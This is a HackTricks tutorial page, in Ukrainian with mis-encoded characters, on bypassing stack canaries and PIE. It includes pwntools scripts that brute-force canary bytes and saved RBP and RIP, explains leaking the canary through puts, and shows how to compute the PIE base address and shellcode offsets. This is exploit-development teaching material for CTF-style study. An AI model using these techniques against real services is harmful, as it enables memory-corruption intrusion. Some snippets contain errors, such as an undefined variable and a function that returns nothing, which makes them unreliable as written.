<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub**.

</details>


**–Ø–∫—â–æ –≤–∏ –º–∞—î—Ç–µ —Å–ø—Ä–∞–≤—É –∑ –±—ñ–Ω–∞—Ä–Ω–∏–º —Ñ–∞–π–ª–æ–º, –∑–∞—Ö–∏—â–µ–Ω–∏–º –∫–∞–Ω–∞—Ä–µ–π–∫–æ—é —Ç–∞ PIE (Position Independent Executable), –≤–∞–º, –π–º–æ–≤—ñ—Ä–Ω–æ, –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞–π—Ç–∏ —Å–ø–æ—Å—ñ–± —ó—Ö –æ–±—ñ–π—Ç–∏.**

![](<../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **`checksec`** –º–æ–∂–µ –Ω–µ –≤–∏—è–≤–∏—Ç–∏, —â–æ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –∑–∞—Ö–∏—â–µ–Ω–∏–π –∫–∞–Ω–∞—Ä–µ–π–∫–æ—é, —è–∫—â–æ –≤—ñ–Ω –±—É–≤ —Å—Ç–∞—Ç–∏—á–Ω–æ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π —ñ –Ω–µ –º–æ–∂–µ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é.\
–û–¥–Ω–∞–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –≤—Ä—É—á–Ω—É –ø–æ–º—ñ—Ç–∏—Ç–∏ —Ü–µ, —è–∫—â–æ –≤–∏ –≤–∏—è–≤–∏—Ç–µ, —â–æ –∑–Ω–∞—á–µ–Ω–Ω—è –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤ —Å—Ç–µ–∫—É –Ω–∞ –ø–æ—á–∞—Ç–∫—É –≤–∏–∫–ª–∏–∫—É —Ñ—É–Ω–∫—Ü—ñ—ó —ñ —Ü–µ –∑–Ω–∞—á–µ–Ω–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –ø–µ—Ä–µ–¥ –≤–∏—Ö–æ–¥–æ–º.
{% endhint %}

# Brute force Canary

–ù–∞–π–∫—Ä–∞—â–∏–π —Å–ø–æ—Å—ñ–± –æ–±—ñ–π—Ç–∏ –ø—Ä–æ—Å—Ç—É –∫–∞–Ω–∞—Ä–µ–π–∫—É - —Ü–µ —è–∫—â–æ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª —î –ø—Ä–æ–≥—Ä–∞–º–æ—é, —è–∫–∞ **—Ä–æ–∑–≥–∞–ª—É–∂—É—î –¥–æ—á—ñ—Ä–Ω—ñ –ø—Ä–æ—Ü–µ—Å–∏ –∫–æ–∂–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ –≤–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç–µ –Ω–æ–≤–µ –∑'—î–¥–Ω–∞–Ω–Ω—è** –∑ –Ω–∏–º (–º–µ—Ä–µ–∂–µ–≤–∏–π —Å–µ—Ä–≤—ñ—Å), –æ—Å–∫—ñ–ª—å–∫–∏ –∫–æ–∂–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ –≤–∏ –ø—ñ–¥–∫–ª—é—á–∞—î—Ç–µ—Å—è –¥–æ –Ω—å–æ–≥–æ, **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ—Ç—å—Å—è —Ç–∞ —Å–∞–º–∞ –∫–∞–Ω–∞—Ä–µ–π–∫–∞**.

–¢–æ–¥—ñ –Ω–∞–π–∫—Ä–∞—â–∏–π —Å–ø–æ—Å—ñ–± –æ–±—ñ–π—Ç–∏ –∫–∞–Ω–∞—Ä–µ–π–∫—É - —Ü–µ –ø—Ä–æ—Å—Ç–æ **–ø–µ—Ä–µ–±—Ä–∞—Ç–∏ —ó—ó –ø–æ—Å–∏–º–≤–æ–ª—å–Ω–æ**, —ñ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∑–Ω–∞—á–∏—Ç–∏, —á–∏ –±—É–≤ –≤—ñ—Ä–Ω–∏–π –≤–≥–∞–¥–∞–Ω–∏–π –±–∞–π—Ç –∫–∞–Ω–∞—Ä–µ–π–∫–∏, –ø–µ—Ä–µ–≤—ñ—Ä–∏–≤—à–∏, —á–∏ –ø—Ä–æ–≥—Ä–∞–º–∞ –≤–ø–∞–ª–∞, —á–∏ –ø—Ä–æ–¥–æ–≤–∂—É—î —Å–≤—ñ–π –∑–≤–∏—á–∞–π–Ω–∏–π —Ö—ñ–¥. –£ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ —Ñ—É–Ω–∫—Ü—ñ—è **–ø–µ—Ä–µ–±–∏—Ä–∞—î 8 –±–∞–π—Ç—ñ–≤ –∫–∞–Ω–∞—Ä–µ–π–∫–∏ (x64)** —ñ —Ä–æ–∑—Ä—ñ–∑–Ω—è—î –º—ñ–∂ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –≤–≥–∞–¥–∞–Ω–∏–º –±–∞–π—Ç–æ–º —Ç–∞ –Ω–µ–≤—ñ—Ä–Ω–∏–º –±–∞–π—Ç–æ–º, –ø—Ä–æ—Å—Ç–æ **–ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏**, —á–∏ **–≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—å** —Å–µ—Ä–≤–µ—Ä–æ–º (—ñ–Ω—à–∏–π —Å–ø–æ—Å—ñ–± —É **—ñ–Ω—à—ñ–π —Å–∏—Ç—É–∞—Ü—ñ—ó** –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **try/except**):

## –ü—Ä–∏–∫–ª–∞–¥ 1

–¶–µ–π –ø—Ä–∏–∫–ª–∞–¥ —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π –¥–ª—è 64-–±—ñ—Ç–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏, –∞–ª–µ –º–æ–∂–µ –±—É—Ç–∏ –ª–µ–≥–∫–æ —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π –¥–ª—è 32-–±—ñ—Ç–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
## –ü—Ä–∏–∫–ª–∞–¥ 2

–¶–µ —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ –¥–ª—è 32-–±—ñ—Ç–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏, –∞–ª–µ —Ü–µ –º–æ–∂–Ω–∞ –ª–µ–≥–∫–æ –∑–º—ñ–Ω–∏—Ç–∏ –Ω–∞ 64 –±—ñ—Ç–∏.\
–¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è —Ü—å–æ–≥–æ –ø—Ä–∏–∫–ª–∞–¥—É **–ø—Ä–æ–≥—Ä–∞–º–∞ —Å–ø–æ—á–∞—Ç–∫—É –æ—á—ñ–∫—É—î –±–∞–π—Ç, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏ —Ä–æ–∑–º—ñ—Ä –≤–≤–µ–¥–µ–Ω–Ω—è** —Ç–∞ –ø–æ–ª–µ–∑–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
# –î—Ä—É–∫ –ö–∞–Ω–∞—Ä–µ–π–∫–∏

–©–µ –æ–¥–∏–Ω —Å–ø–æ—Å—ñ–± –æ–±—ñ–π—Ç–∏ –∫–∞–Ω–∞—Ä–µ–π–∫—É - —Ü–µ **—Ä–æ–∑–¥—Ä—É–∫—É–≤–∞—Ç–∏ —ó—ó**. –£—è–≤—ñ—Ç—å —Å–∏—Ç—É–∞—Ü—ñ—é, –¥–µ **–ø—Ä–æ–≥—Ä–∞–º–∞ –≤—Ä–∞–∑–ª–∏–≤–∞** –Ω–∞ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è —Å—Ç–µ–∫—É –º–æ–∂–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é **puts**, —è–∫–∞ **–≤–∫–∞–∑—É—î** –Ω–∞ **—á–∞—Å—Ç–∏–Ω—É** –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–æ–≥–æ —Å—Ç–µ–∫—É. –ê—Ç–∞–∫—É—é—á–∏–π –∑–Ω–∞—î, —â–æ **–ø–µ—Ä—à–∏–π –±–∞–π—Ç –∫–∞–Ω–∞—Ä–µ–π–∫–∏ —î –Ω—É–ª—å–æ–≤–∏–º –±–∞–π—Ç–æ–º** (`\x00`), –∞ —Ä–µ—à—Ç–∞ –∫–∞–Ω–∞—Ä–µ–π–∫–∏ - **–≤–∏–ø–∞–¥–∫–æ–≤—ñ** –±–∞–π—Ç–∏. –ü–æ—Ç—ñ–º –∞—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è, —è–∫–µ **–ø–µ—Ä–µ–∑–∞–ø–∏—à–µ —Å—Ç–µ–∫ –¥–æ –ø–µ—Ä—à–æ–≥–æ –±–∞–π—Ç—É –∫–∞–Ω–∞—Ä–µ–π–∫–∏**.\
–ü–æ—Ç—ñ–º –∞—Ç–∞–∫—É—é—á–∏–π **–≤–∏–∫–ª–∏–∫–∞—î —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å puts** –ø–æ—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–æ–ª—ñ—Ç—Ä—è, —è–∫–∞ **—Ä–æ–∑–¥—Ä—É–∫—É—î –≤—Å—é –∫–∞–Ω–∞—Ä–µ–π–∫—É** (–∫—Ä—ñ–º –ø–µ—Ä—à–æ–≥–æ –Ω—É–ª—å–æ–≤–æ–≥–æ –±–∞–π—Ç—É).\
–ó —Ü—ñ—î—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –∞—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ç–∞ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –Ω–æ–≤—É –∞—Ç–∞–∫—É**, –∑–Ω–∞—é—á–∏ –∫–∞–Ω–∞—Ä–µ–π–∫—É (—É —Ç—ñ–π —Å–∞–º—ñ–π —Å–µ—Å—ñ—ó –ø—Ä–æ–≥—Ä–∞–º–∏)

–û—á–µ–≤–∏–¥–Ω–æ, —â–æ —Ü—è —Ç–∞–∫—Ç–∏–∫–∞ –¥—É–∂–µ **–æ–±–º–µ–∂–µ–Ω–∞**, –æ—Å–∫—ñ–ª—å–∫–∏ –∞—Ç–∞–∫—É—é—á–æ–º—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **—Ä–æ–∑–¥—Ä—É–∫—É–≤–∞—Ç–∏** **–≤–º—ñ—Å—Ç** —Å–≤–æ–≥–æ **–ø–æ–ª—ñ—Ç—Ä—è** –¥–ª—è **–µ–∫—Å—Ç—Ä–∞–∫—Ü—ñ—ó** **–∫–∞–Ω–∞—Ä–µ–π–∫–∏**, –∞ –ø–æ—Ç—ñ–º –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–µ –ø–æ–ª—ñ—Ç—Ä—è (—É **—Ç—ñ–π —Å–∞–º—ñ–π —Å–µ—Å—ñ—ó –ø—Ä–æ–≥—Ä–∞–º–∏**) —Ç–∞ **–≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏** **—Å–ø—Ä–∞–≤–∂–Ω—î –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞**.\
–ü—Ä–∏–∫–ª–∞–¥ CTF: [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)

# PIE

–î–ª—è –æ–±—Ö–æ–¥—É PIE –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **–≤–∏—Ç—ñ–∫–∞—Ç–∏ –¥–µ—è–∫—É –∞–¥—Ä–µ—Å—É**. –Ü —è–∫—â–æ —É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ –Ω–µ –≤–∏—Ç—ñ–∫–∞—î –∂–æ–¥–Ω–∞ –∞–¥—Ä–µ—Å–∞, —Ç–æ –Ω–∞–π–∫—Ä–∞—â–µ –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ - **–ø–µ—Ä–µ–±–æ—Ä–æ–º RBP —Ç–∞ RIP, –∑–±–µ—Ä–µ–∂–µ–Ω–∏—Ö —É —Å—Ç–µ—Ü—ñ** —É –≤—Ä–∞–∑–ª–∏–≤—ñ–π —Ñ—É–Ω–∫—Ü—ñ—ó.\
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –∑–∞—Ö–∏—â–µ–Ω–∏–π —è–∫ **–∫–∞–Ω–∞—Ä–µ–π–∫–æ—é**, —Ç–∞–∫ —ñ **PIE**, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ—á–∞—Ç–∏ –ø–µ—Ä–µ–±–∏—Ä–∞—Ç–∏ –∫–∞–Ω–∞—Ä–µ–π–∫—É, –ø–æ—Ç—ñ–º **–Ω–∞—Å—Ç—É–ø–Ω—ñ** 8 –±–∞–π—Ç—ñ–≤ (x64) –±—É–¥—É—Ç—å –∑–±–µ—Ä–µ–∂–µ–Ω–∏–º **RBP**, –∞ **–Ω–∞—Å—Ç—É–ø–Ω—ñ** 8 –±–∞–π—Ç—ñ–≤ –±—É–¥—É—Ç—å –∑–±–µ—Ä–µ–∂–µ–Ω–∏–º **RIP**.

–©–æ–± –ø–µ—Ä–µ–±—Ä–∞—Ç–∏ RBP —Ç–∞ RIP –∑ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–∑—É–º—ñ—Ç–∏, —â–æ –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π –≤–≥–∞–¥–∞–Ω–∏–π –±–∞–π—Ç —î –ø—Ä–∞–≤–∏–ª—å–Ω–∏–º, —è–∫—â–æ –ø—Ä–æ–≥—Ä–∞–º–∞ –≤–∏–≤–æ–¥–∏—Ç—å —â–æ—Å—å –∞–±–æ –ø—Ä–æ—Å—Ç–æ –Ω–µ –∫—Ä–∞—à–∏—Ç—å—Å—è. –¢–∞ **—Å–∞–º–∞ —Ñ—É–Ω–∫—Ü—ñ—è**, —è–∫–∞ –Ω–∞–¥–∞–Ω–∞ –¥–ª—è –ø–µ—Ä–µ–±–æ—Ä—É –∫–∞–Ω–∞—Ä–µ–π–∫–∏, –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –¥–ª—è –ø–µ—Ä–µ–±–æ—Ä—É RBP —Ç–∞ RIP:
```python
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
## –û—Ç—Ä–∏–º–∞–Ω–Ω—è –±–∞–∑–æ–≤–æ—ó –∞–¥—Ä–µ—Å–∏

–û—Å—Ç–∞–Ω–Ω—î, —â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑—Ä–æ–±–∏—Ç–∏, —â–æ–± –ø–µ—Ä–µ–º–æ–≥—Ç–∏ PIE, —Ü–µ —Ä–æ–∑—Ä–∞—Ö—É–≤–∞—Ç–∏ **–∫–æ—Ä–∏—Å–Ω—ñ –∞–¥—Ä–µ—Å–∏ –∑ –≤–∏—Ç—ñ–∫—à–∏—Ö** –∞–¥—Ä–µ—Å: **RBP** —Ç–∞ **RIP**.

–ó **RBP** –≤–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–∑—Ä–∞—Ö—É–≤–∞—Ç–∏ **–¥–µ –≤–∏ –ø–∏—à–µ—Ç–µ —Å–≤—ñ–π shell –≤ —Å—Ç–µ–∫—É**. –¶–µ –º–æ–∂–µ –±—É—Ç–∏ –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–æ, —â–æ–± –∑–Ω–∞—Ç–∏, –¥–µ –≤–∏ –∑–±–∏—Ä–∞—î—Ç–µ—Å—è –∑–∞–ø–∏—Å–∞—Ç–∏ —Ä—è–¥–æ–∫ _"/bin/sh\x00"_ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å—Ç–µ–∫—É. –©–æ–± —Ä–æ–∑—Ä–∞—Ö—É–≤–∞—Ç–∏ –≤—ñ–¥—Å—Ç–∞–Ω—å –º—ñ–∂ –≤–∏—Ç—ñ–∫—à–∏–º RBP —Ç–∞ –≤–∞—à–∏–º shellcode, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ **—Ç–æ—á–∫—É –∑—É–ø–∏–Ω–∫–∏ –ø—ñ—Å–ª—è –≤–∏—Ç–æ–∫—É RBP** —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ **–¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤–∞—à shellcode**, –ø—ñ—Å–ª—è —Ü—å–æ–≥–æ –≤–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–∑—Ä–∞—Ö—É–≤–∞—Ç–∏ –≤—ñ–¥—Å—Ç–∞–Ω—å –º—ñ–∂ shellcode —Ç–∞ RBP:
```python
INI_SHELLCODE = RBP - 1152
```
–ó **RIP** –≤–∏ –º–æ–∂–µ—Ç–µ –æ–±—á–∏—Å–ª–∏—Ç–∏ **–±–∞–∑–æ–≤—É –∞–¥—Ä–µ—Å—É PIE-–±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É**, —è–∫–∞ –≤–∞–º –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è **–¥—ñ–π—Å–Ω–æ–≥–æ –ª–∞–Ω—Ü—é–∂–∫–∞ ROP**.\
–©–æ–± –æ–±—á–∏—Å–ª–∏—Ç–∏ –±–∞–∑–æ–≤—É –∞–¥—Ä–µ—Å—É, –ø—Ä–æ—Å—Ç–æ –≤–∏–∫–æ–Ω–∞–π—Ç–µ `objdump -d vunbinary` —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ä–æ–∑—ñ–±—Ä–∞–Ω—ñ –æ—Å—Ç–∞–Ω–Ω—ñ –∞–¥—Ä–µ—Å–∏:

![](<../../.gitbook/assets/image (145).png>)

–£ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Å—å–æ–≥–æ –∫–æ–¥—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –ª–∏—à–µ **1 –±–∞–π—Ç —Ç–∞ –ø—ñ–≤**. –¢–æ–¥—ñ –±–∞–∑–æ–≤–∞ –∞–¥—Ä–µ—Å–∞ –≤ —Ü—ñ–π —Å–∏—Ç—É–∞—Ü—ñ—ó –±—É–¥–µ **–≤–∏—Ç—ñ–∫–∞—Ç–∏ –∑ RIP, –∞–ª–µ –∑–∞–∫—ñ–Ω—á—É–≤–∞—Ç–∏—Å—è –Ω–∞ "000"**. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∏—Ç—ñ–∫ _0x562002970**ecf**_, –±–∞–∑–æ–≤–∞ –∞–¥—Ä–µ—Å–∞ –±—É–¥–µ _0x562002970**000**_.
```python
elf.address = RIP - (RIP & 0xfff)
```
<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Å–≤–æ—é **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>
